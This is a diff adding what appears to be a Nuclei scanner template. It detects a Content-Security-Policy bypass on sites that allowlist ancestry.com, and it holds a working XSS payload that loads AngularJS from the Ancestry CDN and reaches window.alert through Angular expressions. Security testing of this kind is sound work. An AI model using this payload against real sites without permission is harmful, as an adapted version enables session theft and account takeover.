@@ -1,0 +1,55 @@
+id: ancestrycdn-angular-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - AncestryCDN Angular
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,ancestrycdn-angular
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "ancestry.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: ancestrycdn_angular_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "ancestrycdn_angular_csp_xss == true"
+# digest: 4a0a00473045022100b8c7e0a0dcfc64f378b38f26b8eb1a9e3e10f31cec53e519c89b08cb0d1dc19e022061cc8f6f6607460fc4c819208c3bb47617e127b4ce2822b8fe22704357beda76:922c64590222798bb761d5b6d8e72950
